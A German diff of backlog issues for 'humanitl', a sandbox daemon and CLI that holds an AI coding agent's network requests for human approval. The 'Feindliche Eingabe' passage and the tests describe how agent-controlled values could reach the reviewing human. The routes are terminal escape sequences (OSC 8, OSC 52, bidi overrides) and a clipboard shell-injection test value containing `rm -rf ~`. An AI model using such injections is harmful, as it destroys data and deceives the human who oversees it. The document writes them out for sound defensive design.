+- `daemon/crates/core-types/src/diagnostic.rs` mit `DiagnosticCode::ALL`, `for_flow`, `for_session`, `scope`: Datei gibt es nicht (`diagnostics/mod.rs`, `codes.rs`), Liste heißt `CODES`, `scope` wäre eine Vertragsänderung auf drei Seiten.
+- `Check(IsolationCheck)`: nichts erzeugt, nichts verbraucht ein `CheckResult` (Dienst sendet keins, `grpc_daemon_client.dart` verwirft `check_2`, `SandboxUpdate` hat keine Variante, Isolations-Reiter ist `ComingPane`). Harte Abhängigkeit HUM-041.
+- `Flow(FlowId)` ⇒ Feed-Karte: `convert.dart` bildet `diagnostic` (12) und `flow_diagnostic` (16) auf dasselbe `FlowEvent.diagnostic` ohne `flowId` ab, `flows.dart` und `history_page.dart` werfen das Ereignis weg, ein `diagnosticsProvider` existiert nirgends. Das ist seit heute **HUM-106**; hier nur Einbindung.
+- Blocking in `blocked`-Rot: verboten (`docs/UX.md` Regel 6), verschifft ist `state.error` an sechs Stellen.
+- `why_en`/`why_de` vom Daemon: kein solches Feld auf Kern, Leitung oder Dart; die UI übersetzt heute auch keine Titel, und die Ausgabe ist gemischtsprachig (Registertitel deutsch, `why` englisch). Das ist ein echter Mangel, der hier **nicht** behoben wird; beide Wege (Feldpaar auf der Leitung, oder Titel über beide ARBs je Code) sind größer als ein Fallstrick und brauchen ein eigenes Issue.
+- Weiter korrigiert: `humanitl.dev` als Docs-Host; `SANDBOX_012` als „Unexpected socket" (das ist 015); Fix-Labels gegen die verschifften ARB-Einträge; `syn`/`walkdir`/`insta` ohne Eintrag und ohne Fundstelle; `diagnostic_card.dart` heißt `h_diagnostic_card.dart` und hat eine Variante; `sandbox.mounts.cache` und `Setting(profile)` sind keine Schema-Schlüssel; `humanitl daemon logs` und `humanitl sessions logs` gibt es nicht; „vollständige Liste" mit rund 30 von 80 Codes.
+
+**Offen, hier nicht entschieden:** Exit 1 oder 3 für `SANDBOX_001..003`; Symbolformat oder verschifftes Format; Info-Farbe `accent` oder `fg-1`; die Sprache von `title` und `why` (eigenes Issue); Nummern und Schlüssel für Watchdog und Cache-Befund.
+
+**Seit dem Audit überholt:** HUM-040 ist gemerged (Sandbox-Screen mit `_Diagnostics`, Header, Reitern); HUM-106 ist angelegt und trägt den Flow-Pfad (`diagnosticsProvider`, `flowId`, Karte).
+
+**Aus dem Audit nicht bestätigt:** nichts Wesentliches; die Zählung „80 Codes" wurde am Register nachgezählt und stimmt.
+
+**Feindliche Eingabe:** eine Stelle, und sie ist die Mitte dieses Issues. `Diagnostic.why` wird im Daemon aus Werten gebaut, die der Agent wählt — `tls_observe.rs` setzt `host.display()` aus CONNECT/SNI in `TLS_001`, `SANDBOX_015` trägt Socket-Pfade aus der Sandbox, `SANDBOX_022` (HUM-043) Symlink-Pfad und -Ziel, `AGENT_001/002` `agent.command` — und HUM-068 stellt diesen Text vor einen Menschen, im Terminal und in einer Karte, neben einen Knopf. Drei Schuldigkeiten: (1) `render.rs::one_line` säubert keine Escape-Sequenzen; eine `why` mit OSC 8 oder Bidi-Override wird zum Link oder zum umgedrehten Satz im Terminal des Nutzers (der deklarierte Kanal aus AGENTS.md); `sanitize_note` existiert und wird dort nicht benutzt. (2) `Diagnostic.docs_url` reist über die Leitung und wird in Dart wörtlich kopiert; als anklickbarer Link wäre das ein neues Loch — Link aus `DOCS_BASE` plus `docs_anchor`, nie aus der Leitung. (3) `CopyCommand` legt mit einem Klick Text in die Zwischenablage; ein interpolierter Pfad mit `'` bricht aus; `shlex` ist Workspace-Abhängigkeit, damit quotieren, Test mit `a'; rm -rf ~; '`. Keine Grenze in der Sandbox selbst — die menschliche Entscheidung ist die Grenze.
 
 ### Fallstricke
-- `why` muss die konkreten Werte enthalten (Pfad, Host, Version), nicht nur Platzhalter. Diagnostics werden im Daemon mit Werten formatiert; die UI übersetzt nur Titel und Fix-Label über den Code, `why` kommt zweisprachig vom Daemon (`why_en`, `why_de`, Daemon kennt `ui.language`).
-- Keine Diagnostic ohne Code. Keine zwei Codes für denselben Auslöser.
-- CLI-Farben nur bei `isatty(stdout)`, sonst nackter Text.
+- `why` muss die konkreten Werte enthalten (Pfad, Host, Version), nicht nur Platzhalter. Diagnostics werden im Daemon mit Werten formatiert; jeder Wert, der vom Agenten stammt, ist vorher gesäubert und gedeckelt.
+- Keine Diagnostic ohne Code. Keine zwei Codes für denselben Auslöser. Eine Nummer wird nie wiederverwendet (`codes.rs`, Kopf).
+- CLI-Farben nur bei `IsTerminal` auf stderr, sonst nackter Text; `--json` bleibt farblos auf stdout.
+- `codes.rs` und die ARBs sind geteilte Dateien (CLAUDE.md): neu lesen, anhängen; die Strukturänderung an `CodeInfo` vorher anmelden.
+- Titel und `why` stehen heute in verschiedenen Sprachen; dieses Issue macht daraus nichts Schlimmeres und nichts Besseres.
 
 ### Referenzen
-BACKLOG.md ADR-012, Abschnitt 1.3 Prinzip 7; CONVENTIONS.md 3.2, 3.12.
+BACKLOG.md ADR-012, Abschnitt 1.3 Prinzip 7; CONVENTIONS.md 3.2, 3.8, 3.12, 4.6, 4.11, 4.13; `docs/UX.md` Regel 6, 3.3; `docs/DIAGNOSTICS.md`; HUM-041, HUM-043, HUM-044, HUM-045, HUM-069, HUM-106.
 
 ---
 
 ## HUM-067 · `humanitl run`
-Sprint: 3 · Größe: L · Abhängigkeiten: HUM-064, HUM-066, HUM-037, HUM-039, HUM-042, HUM-018 · Blockiert: HUM-046
+Sprint: 3 · Größe: XL · Abhängigkeiten: HUM-064, HUM-066, HUM-037, HUM-039, HUM-018, HUM-104 (gebaut, 2026-09-04), HUM-041 (Check-Ereignisse aus `Sandbox(Start)`), HUM-042 (PTY, Filter, `Terminal`-Handler); nur für die Summary-Zeile HUM-043, nur für den systemd-Zweig HUM-070 · Blockiert: HUM-046
 
 ### Kontext
-ADR-013: Die CLI ist erstklassig. `humanitl run` im Projektverzeichnis startet den Agenten isoliert, ohne dass das UI läuft. `--profile llm-only` liefert die reine Inferenz-Instanz: nur der LLM-Server ist erreichbar, alles andere wird ohne Nachfrage geblockt. Mit `--ask terminal` moderiert der Nutzer im selben Terminal (Muster pipelock). Ein später gestartetes UI hängt sich an dieselbe Session.
+ADR-013: Die CLI ist erstklassig. `humanitl run` im Projektverzeichnis startet den Agenten isoliert, ohne dass das UI läuft. `--profile llm-only` liefert die reine Inferenz-Instanz: nur der LLM-Server ist erreichbar, alles andere wird ohne Nachfrage geblockt. Mit `--ask terminal` moderiert der Nutzer im selben Terminal (Muster pipelock) — für zeilenorientierte Kommandos; für Vollbild-TUI-Agenten wie OpenCode verweigert die CLI das mit `CLI_002` (CONVENTIONS 4.10). Ein später gestartetes UI hängt sich an dieselbe Session.
 
 ### Ziel
-`humanitl run` verbindet sich mit dem Daemon (startet ihn per Socket-Aktivierung), löst das Profil auf, startet eine Session mit `work_dir = cwd`, reicht das PTY des Nutzers durch (Raw-Mode, Resize-Weiterleitung), zeigt gehaltene Requests je nach `--ask` als Terminal-Prompt oder blockt sie, und beendet sich mit dem Exit-Code des Agenten. `Ctrl+C` geht an den Agenten; `Ctrl+]` (wie telnet) öffnet ein kleines Humanitl-Menü (Detach, Stop, Status).
+`humanitl run` verbindet sich mit dem Daemon, löst das Sitzungsprofil auf (streng, `Context::config`, CONVENTIONS 4.23), startet eine Session mit `work_dir = cwd`, reicht das PTY des Nutzers durch (Raw-Mode, Resize-Weiterleitung), zeigt gehaltene Requests je nach `--ask` als Terminal-Prompt oder blockt sie, und beendet sich mit dem Exit-Code des Agenten. `Ctrl+C` geht an den Agenten; `Ctrl+]` (wie telnet) öffnet ein kleines Humanitl-Menü (Stop, Queue). **Der eigentliche Rumpf des Issues, den die erste Fassung nicht nannte:** der Daemon bekommt eine Konfiguration je Sitzung. Heute löst `humanitld` seine `Config` genau einmal beim Start auf (`load_config` mit `discover_with(xdg.env(), &cwd, None)`) und friert Regelspeicher, Haltefrist, Durchreichregel, `SessionId` und `SandboxService::new(config.clone(), …)` darum ein; `--profile`, `--ask`, `--llm` und `-- CMD` haben ohne diesen Umbau keinen Weg in den Daemon.
 
 ### Nicht-Ziel
-Kein eigener Proxy in der CLI (alles läuft im Daemon). Kein Daemon-loser Modus. Kein Multi-Session-Management (nur eine Session pro cwd gleichzeitig).
+Kein eigener Proxy in der CLI (alles läuft im Daemon). Kein Daemon-loser Modus. Kein Multi-Session-Management (nur eine Session pro cwd gleichzeitig). Kein `--ro` (zweiter Weg zu `sandbox.work_mode`; `--work-mode ro` gibt es, und `cli.rs` verbietet zwei Wege zu einem Feld). `--detach` und `attach` sind aus diesem Issue herausgenommen: `attach` braucht eine Sitzungsliste, die kein RPC liefert, und beides fehlt in CONVENTIONS 3.8; wer es baut, ergänzt 3.8 im selben Commit. Kein `SessionSummary` (HUM-043).
 
 ### Betroffene Pfade
-- `daemon/bin/humanitl/src/cmd/run.rs` (neu)
+- `proto/humanitl/v1/humanitl.proto`: `SandboxRequest.Start` bekommt `session_profile`, `ask_mode` und `repeated CliOverride { string path; string value }`; `profile` bleibt das bwrap-Profil, das `ipc/src/sandbox.rs::profile_path` unter `profiles/sandbox/` sucht (`profiles/sandbox/llm-only.toml` gibt es nicht; `profiles/llm-only.toml` ist ein Sitzungsprofil). `scripts/gen-proto.sh`, `proto/generated.sha256`, `proto/descriptor.binpb`.
+- `daemon/bin/humanitld/src/main.rs`, `daemon/crates/ipc/src/sandbox.rs`: `SandboxService` nimmt den Resolver statt einer eingefrorenen `Config`; `start` löst `Resolved` aus Profil plus Overrides auf und baut Regelspeicher, Haltefrist und Durchreiche für diese Sitzung neu
+- `daemon/bin/humanitld/src/main.rs` (`load_rules`): `Profile::rules_document()` mit `humanitl_rules::parse_rules` und `Profile::rule_files()` einlesen, Rang 4 (CONVENTIONS 4.5); heute hat `rules_document()` außerhalb von Tests keinen Leser, und HUM-104 hat die Verdrahtung ausdrücklich hierher gelegt
+- `daemon/crates/ipc/src/server.rs` (`subscribe`, `sandbox`, `terminal`) — es gibt keine `daemon/crates/ipc/src/service.rs`
+- `daemon/bin/humanitl/src/cmd/run.rs` (vorhanden: `ctx.config()` und `session_lines` aus HUM-066, endet mit `not_yet_failure("humanitl run", "HUM-067")`)
 - `daemon/bin/humanitl/src/tty.rs` (neu): Raw-Mode, Resize, Restore
 - `daemon/bin/humanitl/src/ask_terminal.rs` (neu): Prompt-Renderer
-- `daemon/crates/ipc/src/service.rs`: `Sandbox(Start)` mit `ask_mode`, `Subscribe` mit Filter `held_only`
-- `daemon/crates/proxy/src/hold.rs`: `ask_mode == none` Pfad
+- `daemon/crates/core-types/src/diagnostics/codes.rs`: ein `CLI_00n` für die zweite Sitzung im selben Ordner (kein Bereich `SESSION`, kein Bereich `PROJECT` in `AREAS`)
+- Nur wenn `--ask none` auf `403` wechselt (Entscheidung, siehe Spezifikation): `daemon/crates/core-types/src/flow.rs` (`BlockReason::AskModeNone`), Proto `BLOCK_REASON_ASK_MODE_NONE`, CONVENTIONS 3.2 (Statuskommentar), Dart-Spiegel, **und** `agents/opencode/briefing.en.md`, `briefing.de.md`, `daemon/crates/sandbox/src/agent/briefing.rs` (Test `ask_mode_none_replaces_the_sentence_about_waiting` hält heute `504` fest)
 - `docs/cli.md` (neu)
 
 ### Spezifikation
 
-Syntax (CONVENTIONS.md 3.8):
+Syntax (CONVENTIONS.md 3.8, unverändert):
 
 ```
-humanitl run [--profile NAME] [--work DIR] [--ask ui|terminal|none] [--llm URL] [--ro] [--detach] [-- CMD...]
+humanitl run [--profile NAME] [--work DIR] [--work-mode ro|rw] [--ask ui|terminal|none] [--llm URL] [-- CMD...]
 ```
+
+`--work`, `--work-mode`, `--ask`, `--llm` entstehen schon aus dem Schema (`SHORT_FLAGS` in `cli.rs`), `RunArgs` nimmt das nachgestellte `-- CMD`; `--profile` ist global und bedeutet unter `humanitl run` das Sitzungsprofil (CONVENTIONS 4.23, Nachtrag).
 
 Semantik:
-- `--work` Default cwd. Muss existieren und lesbar sein (`PROJECT_002`).
-- `--ask` Default aus Profil (`hold.ask_mode`). `ui`: Requests bleiben in der Queue, die CLI zeigt nur `[humanitl] request held: …` als Zeile, das UI entscheidet (oder Timeout). `terminal`: Prompt im Terminal (unten). `none`: Default-Verdict ⇒ sofort Block, Zeile `[humanitl] blocked (no rule): GET example.com/…`.
-- `--llm` überschreibt `llm.endpoint` (Origin `Cli`).
-- `--ro` setzt `sandbox.work_mode = ro`.
-- `-- CMD...` überschreibt `agent.command` für diese Session (z. B. `-- bash`, um in der Sandbox zu arbeiten).
-- `--detach` startet die Session und beendet die CLI sofort; Ausgabe: `session <id> started; attach with: humanitl attach <id>` (`attach` ist ein neues Subkommando, gleiche Implementierung wie `run` ohne Start).
+- `--work` Default cwd. Muss existieren und benutzbar sein; heute prüft `check_work_dir` (`profile.rs`) die Mount-Politik und antwortet `SANDBOX_006`, und `ipc/src/sandbox.rs` prüft absolut, ohne `..`, unter `$HOME` oder gleich `sandbox.work_dir` (CONVENTIONS 4.17). Es gibt kein `PROJECT_002`.
+- `--ask` Default aus Profil (`hold.ask_mode`). `ui`: Requests bleiben in der Queue, die CLI zeigt nur `[humanitl] request held: …` als Zeile, das UI entscheidet (oder Timeout). `terminal`: Prompt im Terminal (unten); verweigert, wenn `AgentAdapter::is_fullscreen_tui()` gilt (OpenCode: `true`, Vorgabe-Adapter `opencode`), mit `CLI_002` und dem Vorschlag `--ask ui` oder `--ask none`. **Wie die `ask_terminal_*`-Tests dann laufen, ist zu entscheiden:** entweder hängt die Verweigerung am wirksamen Kommando, wenn `-- CMD` gegeben ist, oder die Tests setzen `agent.adapter` auf einen Nicht-TUI-Adapter. `none`: siehe unten.
+- `--llm` überschreibt `llm.endpoint` (Origin `Cli`); wirkt nur mit der Konfiguration je Sitzung.
+- `-- CMD...` überschreibt `agent.command` für diese Session (z. B. `-- bash`, um in der Sandbox zu arbeiten); reist als `Start.command`, das es schon gibt.
 
 Ablauf:
 
-1. Daemon verbinden (UDS). Fehlschlag ⇒ versuchen, `systemctl --user start humanitld.socket` auszuführen (nur wenn Unit existiert), 2 s warten, erneut. Dann `DAEMON_001`, Exit 2.
-2. `GetInfo`, Versionscheck (`DAEMON_002`, Exit 1).
-3. Profil auflösen (`resolve()` in der CLI, für Fehlermeldungen; der Daemon löst erneut auf, die CLI schickt nur `ProfileSelection` + CLI-Overrides).
+1. Daemon verbinden (UDS). Fehlschlag ⇒ `DAEMON_001`, Exit 2 (`client::channel` liefert den Befund). Der Zweig `systemctl --user start humanitld.socket` bleibt als Wächter stehen, feuert aber nie, bevor HUM-070 eine Unit liefert: `packaging/systemd/` hält nur `.gitkeep`, `DaemonCmd` hat nur `Status`, `LISTEN_FDS` liest niemand.
+2. `GetInfo`, Versionscheck (`DAEMON_002`, Exit 1) — vorhanden in `cmd/daemon.rs`, wiederverwenden.
+3. Sitzungsprofil auflösen: `ctx.config()` als **erster** Aufruf (CONVENTIONS 4.23; das ist der `CONFIG_003`-Riegel gegen ein feindliches Projekt-Profil), dann `ProfileSelection` plus CLI-Overrides an den Daemon, der für die Sitzung erneut auflöst.
 4. Terminalgröße lesen (`ioctl TIOCGWINSZ`), Raw-Mode setzen (`termios`: `cfmakeraw`, `ISIG` bleibt aus, damit Ctrl+C als Byte an den Agenten geht), Restore bei jedem Exit-Pfad (inklusive Panic-Hook und `SIGTERM`).
-5. `Sandbox(Start { profile, work_dir, work_mode, ask_mode, cli_overrides })`. Events streamen: `IsolationResult` × 3 werden als drei Zeilen gedruckt (`✔ no network interface`, …), Fehlschlag ⇒ Diagnostic-Block, Exit 3.
-6. `Terminal`-Bidi-Stream öffnen, zuerst `Resize`. stdin ⇒ `data`, `data` ⇒ stdout. `SIGWINCH` ⇒ `Resize`.
-7. Parallel `Subscribe { held_only: true }` für `--ask terminal|ui`.
-8. Bei `Exit { code }`: Terminal restore, Summary-Kurzform drucken (HUM-043: „3 files changed, 1 finding, 0 symlinks. Details: humanitl sessions summary <id>"), Exit mit `code` (Signal ⇒ 128+n).
+5. `Sandbox(Start { profile: <bwrap>, session_profile, work_dir, work_mode, ask_mode, cli_overrides, command })`. Events streamen: drei `SandboxEvent.check` (`CheckResult`, HUM-041; ein Typ `IsolationResult` existiert nicht) werden als drei Zeilen gedruckt (`✔ no network interface`, …), Fehlschlag ⇒ Diagnostic-Block, Exit 3.
+6. `Terminal`-Bidi-Stream öffnen: zuerst `Open { sandbox_id, cols, rows, read_only: false }` (HUM-042). stdin ⇒ `data`, `data` ⇒ stdout. `SIGWINCH` ⇒ `Resize`.
+7. Parallel `Subscribe` für `--ask terminal|ui`; `SubscribeRequest` hat `since_flow_id` und `include_passthrough`, kein `held_only` — der Client filtert auf `FlowEvent.Held`. Wer `held_only` will, fügt `bool held_only = 3` hinzu und verdrahtet es in `subscribe`; client-seitig ist billiger.
+8. Bei `Exit { code }`: Terminal restore, Exit mit `code` (Signal ⇒ 128+n, `exit_code_of` in `cmd/sandbox.rs`). Die Summary-Kurzzeile („3 files changed, …") kommt erst mit HUM-043.
 
-`Ctrl+]` (0x1D) wird von der CLI abgefangen (nicht ans PTY geschickt) und zeigt eine Zeile `[humanitl] (d)etach (s)top (q)ueue (Esc) back`. `q` listet gehaltene Flows mit Nummer, `a<n>`/`b<n>` entscheiden. Das ist der Notausgang, wenn `--ask ui` läuft und kein UI da ist.
+`Ctrl+]` (0x1D) wird von der CLI abgefangen (nicht ans PTY geschickt) und zeigt eine Zeile `[humanitl] (s)top (q)ueue (Esc) back`. `q` listet gehaltene Flows mit Nummer, `a<n>`/`b<n>` entscheiden. Das ist der Notausgang, wenn `--ask ui` läuft und kein UI da ist.
 
-Prompt-Format `--ask terminal` (wird auf stderr geschrieben, während stdout weiter den Agenten zeigt; zur Vermeidung von Zeilensalat wird die Agent-Ausgabe für die Dauer des Prompts gepuffert, max. 256 KiB, dann durchgeleitet):
+Prompt-Format `--ask terminal` (wird auf stderr geschrieben, während stdout weiter den Agenten zeigt; zur Vermeidung von Zeilensalat wird die Agent-Ausgabe für die Dauer des Prompts gepuffert, max. 256 KiB, dann durchgeleitet — **durch denselben OSC-Filter, den HUM-042 im Daemon baut**, und der Prompt wird nach jedem Durchleiten neu gezeichnet):
 
 ```
 ┌─ humanitl · request held (1 of 2) ─────────────────────────────── 04:52 left ─┐
@@ -1560,85 +1771,118 @@ Prompt-Format `--ask terminal` (wird auf stderr geschrieben, während stdout wei
 └────────────────────────────────────────────────────────────────────────────────┘
 ```
 
-Tasten: `a` Allow einmal; `s` Allow + Regel `expires: session` mit Ziel Host; `b` Block; `r` öffnet Zwei-Schritt-Auswahl (Ziel: `1` exact URL, `2` host, `3` apex `**.`, `4` host+method; Dauer: `1` once, `2` session, `3` forever) und zeigt den Regelsatz vor Bestätigung mit `Enter`; `e` schreibt Request als Datei nach `$XDG_RUNTIME_DIR/humanitl/edit-<id>.http` (Roh-HTTP), öffnet `$EDITOR`, nach Schließen wird die Datei geparst und als `AllowEdited` gesendet (Parse-Fehler ⇒ zurück zum Prompt mit Fehlerzeile); `v` zeigt die ersten 4 KiB des Bodys mit `less`-artigem Pager (eingebaut, `q` zurück); `n` nächster gehaltener Request ohne Entscheidung. Countdown oben rechts aktualisiert sekündlich. Timeout ⇒ Zeile `[humanitl] timed out → blocked` und Prompt für den nächsten. `Ctrl+C` im Prompt ⇒ Prompt schließen (Request bleibt gehalten), zurück zum Agenten.
+Jedes Feld läuft durch `humanitl_core::block::sanitize_note` und wird auf Anzeigebreite geklemmt. Tasten: `a` Allow einmal; `s` Allow + Regel `expires: session` mit Ziel Host (über `Decide.remember`, nie lokal ausgewertet); `b` Block; `r` öffnet Zwei-Schritt-Auswahl (Ziel: `1` exact URL, `2` host, `3` apex `**.`, `4` host+method; Dauer: `1` once, `2` session, `3` forever) und zeigt den Regelsatz vor Bestätigung mit `Enter`; `e` schreibt Request als Datei nach `$XDG_RUNTIME_DIR/humanitl/edit-<id>.http` (0600, nie in `/work` oder cwd, auf jedem Ausgang gelöscht), öffnet `$EDITOR`, nach Schließen wird die Datei geparst und als `AllowEdited` gesendet (Parse-Fehler oder `IPC_004` ⇒ zurück zum Prompt mit Fehlerzeile); `v` zeigt die ersten 4 KiB des Bodys mit eingebautem Pager, der nicht druckbare Bytes hex-rendert — `GetBody` liefert Rohbytes, und der Filter aus HUM-042 sitzt am PTY-Strom, nicht an `GetBody`; `n` nächster gehaltener Request ohne Entscheidung. Countdown oben rechts aktualisiert sekündlich. Timeout ⇒ Zeile `[humanitl] timed out → blocked` und Prompt für den nächsten. `Ctrl+C` im Prompt ⇒ Prompt schließen (Request bleibt gehalten), zurück zum Agenten.
 
-`--ask none` im Daemon: `HoldQueue` wird umgangen; `Verdict::Default` ⇒ `Decision::Block { reason: BlockReason::AskModeNone }` (neue Variante), Client erhält `403` mit `reason: ask_mode_none`. Der Flow wird als `Decided` aufgezeichnet, mit `rule_id = NULL`.
+`--ask none` im Daemon — **zu entscheiden, hier steht der Ist-Zustand:** heute setzt `main.rs` `AskMode::None => Duration::ZERO`, die Warteschlange nimmt den Fluss mit abgelaufener Frist an, `Ticket::wait` endet `TimedOut`, `handler.rs` verbucht `BlockReason::Timeout`, HTTP `504`, `DECISION_KIND_TIMED_OUT`; `model.rs` dokumentiert es so, und das Agenten-Briefing (HUM-071, gemerged) sagt dem Agenten wörtlich `504` mit Test in `briefing.rs`. `profiles/llm-only.toml` behauptet im Kommentar „sofort geblockt". Entweder bleibt `504` (kostet nichts, ist wahr, der Profil-Kommentar wird korrigiert), oder es wird `403` mit `BlockReason::AskModeNone` — dann samt Proto, CONVENTIONS 3.2, Dart, beiden Briefing-Dateien und dem Test im selben Commit, sonst erzählt genau die Version, die es ändert, dem Agenten den falschen Status.
 
-Exit-Codes: Agent-Exit-Code durchgereicht; 2 Daemon nicht erreichbar; 3 Isolation-Check fehlgeschlagen; 1 Nutzerfehler (Profil, Pfad); 4 nur für Tests.
+Exit-Codes: Agent-Exit-Code durchgereicht; 2 Daemon nicht erreichbar; 3 Isolation-Check fehlgeschlagen; 1 Nutzerfehler (Profil, Pfad); 4 ist `EXIT_SECURITY` (`cmd/mod.rs`, `--help`, CONVENTIONS 3.8) und nicht „nur für Tests". Bekannte Kollision: ein Agent, der selbst mit 2 oder 3 endet, ist von einem Daemon- oder Isolationsfehler nicht zu unterscheiden; `docs/cli.md` sagt das.
 
-Signal-Handling: `SIGINT` im Raw-Mode kommt als Byte 0x03 und geht an den Agenten; `SIGTERM` an die CLI ⇒ `Sandbox(Stop)`, Restore, Exit 143; `SIGHUP` (Terminal geschlossen) ⇒ Session läuft weiter (Detach-Verhalten), Meldung ins Daemon-Log.
+Signal-Handling: `SIGINT` im Raw-Mode kommt als Byte 0x03 und geht an den Agenten; `SIGTERM` an die CLI ⇒ `Sandbox(Stop)`, Restore, Exit 143; `SIGHUP` (Terminal geschlossen) ⇒ Session läuft weiter, Meldung ins Daemon-Log.
 
-Attach durch UI: Das UI zeigt in der Session-Liste (Sandbox-Screen Header-Dropdown, neu) alle laufenden Sessions mit Herkunft `cli · ~/clients/acme`. Auswahl ⇒ `Terminal`-Stream (die CLI wird nicht getrennt; die Ein-Client-Regel aus HUM-042 wird für den Fall CLI+UI gelockert: ein **schreibender** Client (CLI) und beliebige **lesende** Clients (`TerminalInput.detach` = read-only-Modus bei Verbindungsaufbau, neues Feld `read_only: bool`). Hold-Entscheidungen kann jeder Client treffen; die erste gewinnt, die zweite erhält `NotHeld`.
+Attach durch UI: Das UI zeigt die laufende Sitzung im Sandbox-Screen (heute genau eine je Daemon, `SandboxService`) und öffnet den `Terminal`-Stream mit dem **vorhandenen** `TerminalInput.Open.read_only = true` — kein neues Feld, kein `detach`. Ein Schreiber (die CLI), beliebig viele Leser (CONVENTIONS 4.10, HUM-042). Hold-Entscheidungen kann jeder Client treffen; die erste gewinnt, die zweite erhält `IPC_003`.
 
 ### Schritte
-1. `tty.rs`: Raw-Mode mit garantiertem Restore (Guard-Struct, `Drop`, Panic-Hook, Signal-Handler via `signal-hook`).
-2. `run.rs`: Verbindung, Profil, Start, Isolation-Ausgabe, Terminal-Bridge, Exit-Code.
-3. `--ask none` im Daemon, `BlockReason::AskModeNone`.
-4. `ask_terminal.rs`: Prompt-Rendering, Tastenbelegung, Regel-Dialog, Editor-Roundtrip, Pager, Ausgabe-Pufferung während Prompt.
-5. `Ctrl+]`-Menü, `--detach`, `attach`.
-6. Terminal-Handler: `read_only`-Clients.
-7. `docs/cli.md`.
-8. Integrationstests mit `expectrl` (PTY-Testtreiber) gegen echten Daemon und `-- sh`.
+1. Drei Entscheidungen im Text festhalten, bevor Code entsteht: (a) Konfiguration je Sitzung im Daemon oder HUM-067 schrumpft auf das, was ohne sie geht; (b) `--ask none` bleibt `504` oder wird `403`; (c) wie `run --ask terminal` OpenCode mit `CLI_002` verweigert und womit die drei `ask_terminal_*`-Tests dann laufen.
+2. Proto: `session_profile`, `ask_mode`, `cli_override` an `Start`; Codegen.
+3. `SandboxService` sitzungsbezogen; `load_rules` liest Profilregeln (Rang 4); Test: `--profile llm-only` blockt `example.com` per Regel, die Durchreiche erreicht das Modell weiterhin (HUM-104 hält Rang 1 mit einem Test am Ladeweg).
+4. Ask-Modus nach (b), mit allen genannten Dateien.
+5. `CLI_00n` für die zweite Sitzung im selben Ordner registrieren; Fallstrick unten.
+6. HUM-041 und HUM-042 landen (drei `SandboxEvent.check`, PTY, Filter, Handler mit `read_only`). Ohne beide ist HUM-067 nicht fertig.
+7. `tty.rs`: Raw-Mode-Guard mit `Drop`, Panic-Hook, `SIGTERM`/`SIGHUP`-Handler, `TIOCGWINSZ`/`SIGWINCH`, `cfmakeraw` mit `ISIG` aus. Die termios- und Signal-Abhängigkeiten stehen nicht in `daemon/Cargo.toml` (`libc` 0.2 ja; `nix`, `signal-hook`, `expectrl` nein); der Elternagent trägt ein, was nötig ist.
+8. `run.rs` umschreiben: `ctx.config()` zuerst, `ctx.connect()`, `DAEMON_002` aus `cmd/daemon.rs`, `Sandbox(Start …)`, drei Check-Zeilen, Exit 3, `Terminal`-Bridge, `exit_code_of`. Vorbild ist `cmd/sandbox.rs` (`start`, `enforce_isolation`, `wait_or_interrupt`, `finish`) — mit dem Unterschied, dass bwrap nicht mehr im CLI-Prozess startet.
+9. `ask_terminal.rs`, `Ctrl+]`-Menü, `docs/cli.md`.
+10. Integrationstests gegen echten Daemon mit `-- sh`.
 
 ### Tests
-- `run_sh_echo_exit_code`: `humanitl run --profile llm-only -- sh -c 'echo hi; exit 7'` ⇒ stdout enthält `hi`, Exit 7, Isolation-Zeilen erscheinen zuerst.
-- `run_llm_only_blocks_curl`: `-- sh -c 'curl -sS -o /dev/null -w "%{http_code}" https://example.com'` ⇒ `403`, Flow `Decided(Block{AskModeNone})`, kein Held.
+- `run_sh_echo_exit_code`: `humanitl run --profile llm-only -- sh -c 'echo hi; exit 7'` ⇒ stdout enthält `hi`, Exit 7, Check-Zeilen erscheinen zuerst.
+- `run_llm_only_blocks_curl`: `-- sh -c 'curl -sS -o /dev/null -w "%{http_code}" https://example.com'` ⇒ `403`, Flow `Decided(Block { reason: Rule(<Id der Blockregel aus llm-only>) })`, kein Held. Nicht `AskModeNone`: die Profilregel `block host "**"` entscheidet vorher.
+- `run_default_ask_none_status`: Profil `default`, `--ask none`, Host ohne Regel ⇒ der Status aus Entscheidung (b).
 - `run_llm_only_allows_llm`: Fake-LLM unter `--llm` ⇒ `curl … /v1/models` ⇒ `200`.
-- `ask_terminal_prompt_allow`: `--ask terminal -- sh -c 'curl …'` mit `expectrl`: Prompt erscheint mit `request held`, Taste `a` ⇒ curl liefert 200.
-- `ask_terminal_rule_session`: Taste `s` ⇒ zweiter curl zum selben Host ohne Prompt.
-- `ask_terminal_timeout_blocks`: `hold.timeout_secs=2`, keine Taste ⇒ `timed out → blocked`, curl 403.
+- `ask_terminal_prompt_allow`, `ask_terminal_rule_session`, `ask_terminal_timeout_blocks`: mit dem Aufruf aus Entscheidung (c); PTY-Treiber wie vom Elternagenten freigegeben.
+- `ask_terminal_refuses_tui_agent`: Vorgabe-Adapter ⇒ `CLI_002`.
 - `raw_mode_restored_on_panic` (Unit mit simuliertem Panic).
 - `sigterm_stops_session_exit_143`.
-- `attach_read_only_sees_output`.
+- `attach_read_only_sees_output`, `reader_cannot_write`.
+- `pager_renders_control_bytes_inert`: Body mit `\x1b]52;…\x07` ⇒ hex, kein ESC im Terminal.
 
 ### Akzeptanzkriterien
-- [ ] `cd ~/projekt && humanitl run --profile llm-only` startet OpenCode, der Prompt erscheint, `webfetch` liefert dem Agenten eine 403-Meldung, Inferenz funktioniert.
-- [ ] `humanitl run --ask terminal` zeigt den Prompt exakt im Format oben, `a`/`b`/`s`/`r`/`e`/`v`/`n` funktionieren.
+- [ ] `cd ~/projekt && humanitl run --profile llm-only` startet OpenCode, der Prompt erscheint, `webfetch` liefert dem Agenten `403` aus der Profilregel, Inferenz funktioniert (Durchreiche Rang 1).
+- [ ] `humanitl run --ask terminal -- <zeilenorientiertes Kommando>` zeigt den Prompt exakt im Format oben, `a`/`b`/`s`/`r`/`e`/`v`/`n` funktionieren; mit dem OpenCode-Adapter antwortet `run --ask terminal` mit `CLI_002`.
 - [ ] Terminal ist nach jedem Exit-Pfad (normal, Ctrl+], SIGTERM, Panic) wieder im Normalmodus (`stty -a` zeigt `icanon echo`).
-- [ ] UI zeigt die CLI-Session und kann sie read-only beobachten und Hold-Entscheidungen treffen.
-- [ ] `docs/cli.md` beschreibt alle Flags, Tasten und Exit-Codes.
+- [ ] UI zeigt die CLI-Session, beobachtet sie read-only über `Open.read_only` und kann Hold-Entscheidungen treffen.
+- [ ] `docs/cli.md` beschreibt alle Flags, Tasten und Exit-Codes, wie sie sind.
+
